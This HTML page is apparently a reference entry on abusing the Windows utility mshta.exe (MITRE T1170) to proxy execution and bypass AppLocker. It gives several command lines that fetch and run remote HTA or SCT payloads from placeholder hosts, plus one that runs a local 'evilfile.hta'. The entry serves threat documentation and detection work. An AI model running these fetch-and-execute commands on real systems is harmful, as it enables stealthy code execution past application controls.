<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Mshta</title>
</head><body><span style="font-size: 10pt"><a href="https://attack.mitre.org/techniques/T1170/">https://attack.mitre.org/techniques/T1170/</a>&nbsp; <br/>
<br/>
<br/>
<span style="font-family: Roboto-Regular"><div style="text-align: left">Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. <a href="https://en.wikipedia.org/wiki/HTML_Application">[1]</a> HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. <a href="https://msdn.microsoft.com/library/ms536471.aspx">[2]</a><br/>
</div></span><br/>
<span style="font-family: Roboto-Regular"><div style="text-align: left">Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code <a href="https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf">[3]</a> <a href="https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/">[4]</a> <a href="https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html">[5]</a> [6] <a href="https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html">[7]</a><br/>
</div></span><br/>
<span style="font-family: Roboto-Regular"><div style="text-align: left">Files may be executed by mshta.exe through an inline script: <br/>
mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))<br/>
</div></span><br/>
<span style="font-family: Roboto-Regular"><div style="text-align: left">They may also be executed directly from URLs: <br/>
mshta http[:]//webserver/payload[.]hta<br/>
</div></span><br/>
<span style="font-family: Roboto-Regular"><div style="text-align: left">Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]<br/>
</div></span>&nbsp; <br/>
<br/>
</span>Executes code inside evilfile.hta.<span style="font-size: 10pt"><br/>
</span>mshta.exe C:\poc\evilfile.hta &nbsp;<br/>
<br/>
Executes remote SCT file <br/>
mshta.exe javascript:a=GetObject("script:https://gist.github.com/someone/something.sct").Exec();close(); <br/>
<br/>
Executes hta file from external webserver <br/>
mshta.exe http://webserver/payload.hta <ul><li></li>
<li>Windows binary: True</li>
<li>Bypasses Default AppLocker Rules: True</li>
<li>Mitre: <a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a></li>
<li>Links:</li>
<li style="list-style-type: none"><ul><li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md</a></li>
<li><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></li>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct</a></li>
<li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a>&nbsp;</li>
<li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></li>
</ul>
</li>
</ul>
File path:<ul><li style="list-style-type: none"><ul><li>C:\Windows\System32\mshta.exe</li>
</ul>
</li>
</ul>
<ul><li>C:\Windows\SysWOW64\mshta.exe</li>
<li>Acknowledgement:</li>
<li style="list-style-type: none"><ul><li>Name: Casey Smith</li>
<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@Subtee">@Subtee</a></li>
<li>Blog: <a href="https://subt0x11.blogspot.com/">https://subt0x11.blogspot.com/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<br/>
OS:<br/>
</body></html>